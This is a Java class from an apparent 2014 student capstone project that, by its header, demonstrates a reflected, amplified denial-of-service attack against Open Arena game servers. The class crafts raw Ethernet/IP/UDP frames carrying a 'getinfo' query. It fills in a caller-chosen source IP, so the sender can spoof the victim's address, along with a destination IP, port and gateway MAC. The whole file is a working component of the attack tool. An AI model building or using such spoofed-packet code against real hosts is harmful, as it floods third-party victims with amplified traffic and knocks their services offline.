/** 
 * Class: CMSC495 Spring 2014
 * Assignment: Capstone, Week 8, Final
 * 
 * Team Members: Brad Norman, Jamie Lane, Daniel Ross
 * 
 * Date: 26 April 2014 
 * 
 * File:	RdosTester.java (main application) 	
 * 			->RdosPacket.java<-
 * 			PacketTransmitter.java
 * 			Analysis.java
 * 			
 * 			Demonstrate a reflected and amplified Denial-of-Service attack mechanism
 * 			exploiting a vulnerability in Open Arena server versions <= 0.8.5
 * 
 * Current Status: Operational as described
 * 
 * @author Daniel Ross
 *           
 **/

package teamC;

// models an IP packet
public class RdosPacket {
	
	// source address
	private String srcIp;
	
	// destination address
	private String dstIp;
	
	// destination port
	private String dstPort;
	
	// holds string hex representing gateway MAC
	private String gatewayMac;
	
	// "getInfo message" included to portability problems with getStatus
	private String packetBase = "ffffffffffff00241dd16fb608004500002b7c5000008011a5bfc0a8580affffffff6d386d3b001762cbffffffff676574696e666f20787878000000";
	
	// holds ethernet frame with user-specified addresses, port, and gateway MAC
	private String completePacket;
	
	// holds size of packet in bytes
	private int packetSize;	
	
	// constructor requiring complete packet as String representing hex
	// useful for received packets
	public RdosPacket(String completePacket)
	{
		this.completePacket = completePacket;
		
		// calculate packet size in bytes, minus ethernet header
		packetSizeCalc();
	
	}	// end Packet constructor

	// constructor requiring source and destination address and port info, as well as gateway MAC
	// useful for creating packets to transmit
	// requires checksums and source MAC to be updated before transmission
	public RdosPacket(int srcIP1, int srcIP2, int srcIP3, int srcIP4, int dstIP1, int dstIP2, int dstIP3, int dstIP4, int port, String gatewayMac)
	{
		// convert source address to hex, add leading zeroes if necessary, concatenate
		this.srcIp = formatOctet(srcIP1) + formatOctet(srcIP2) + formatOctet(srcIP3) + formatOctet(srcIP4);
		
		// convert destination address to hex, add leading zeroes if necessary, concatenate
		this.dstIp = formatOctet(dstIP1) + formatOctet(dstIP2) + formatOctet(dstIP3) + formatOctet(dstIP4);
		
		// convert destination port to hex, add leading zeroes if necessary
		this.dstPort = formatPort(port);
		
		// save gateway MAC
		this.gatewayMac = gatewayMac;
		
		// overwrite packetBase IP and UDP header fields with user specified info
		packetRewrite();
		
		// calculate packet size in bytes
		packetSizeCalc();
		
	}  // end Packet constructor
	
	// calculate packet size in bytes, subtracts byte-count for ethernet header
	private void packetSizeCalc() {
		
		packetSize = (completePacket.length() / 2) - 14;
		
	}  // end method packetSizeCalc	
	
	// converts integer representation of IP address octets into a hex string, with leading zeroes
	private String formatOctet(int octet)
	{
		return Integer.toHexString(0x100 | octet).substring(1);
	
	}  // end method formatOctet
	
	// converts integer representation of network port into a hex string, with leading zeroes
	private String formatPort(int port)
	{
		return Integer.toHexString(0x10000 | port).substring(1);
	
	} // end method formatPort
	
	// overwrite packetBase IP and UDP header fields with user specified info
	private void packetRewrite()
	{
		completePacket = gatewayMac + packetBase.substring(12,52) + srcIp + dstIp + packetBase.substring(68,72) 
				         + dstPort + packetBase.substring(76,packetBase.length());
		
	} // end method packetRewrite
	
	// return packet size
	public int getPacketSize() {
		
		return packetSize;
	
	} // end method getPacketSize
	
	// return destination port; useful for filtering captures
	public String getPort() {
		
		return completePacket.substring(73,76);
	
	} // end method getPort
	
	// returns completePacket as string representation of packet object 	
	public String toString()
	{
		return completePacket;
	
	}  // end method toString

} // end class Packet